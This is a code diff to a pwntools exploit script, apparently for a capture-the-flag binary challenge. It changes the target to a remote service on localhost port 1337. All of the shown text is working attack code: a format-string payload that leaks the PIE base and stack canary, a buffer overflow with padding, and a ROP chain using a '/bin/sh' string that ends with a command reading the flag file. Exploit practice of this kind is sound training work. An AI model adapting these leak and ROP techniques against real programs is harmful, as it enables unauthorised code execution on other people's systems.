@@ -14,7 +14,8 @@ c
 """
 
 # io = gdb.debug(path, gdbscript=gdbscript)
-io = process(path)
+# io = process(path)
+io = remote("localhost", 1337)
 
 # leak PIE and canary
 payload = b"%11$p|%13$p"
@@ -43,10 +44,11 @@ chain = [
     pie_base + rop.rsi.address,
     0xdeadb33f,
     pie_base + rop.rdx.address,
-    0x413a53,
+    next(exe.search(b"/bin/sh")),
     pie_base + rop.ret.address,
     exe.symbols["hospital"]
 ]
+info([hex(a) for a in chain])
 chain = b"".join([p64(a) for a in chain])
 
 padding = 13 * 8 * b"A"
@@ -57,7 +59,7 @@ payload += chain
 io.sendlineafter(b"already.", payload)
 
 io.recvuntil(b"sir.\n")
-io.sendline(b"cat chall/flag.txt")
+io.sendline(b"cat flag.txt")
 success(f"Flag: {io.recvline().strip().decode()}")
 io.close()
 # io.interactive()
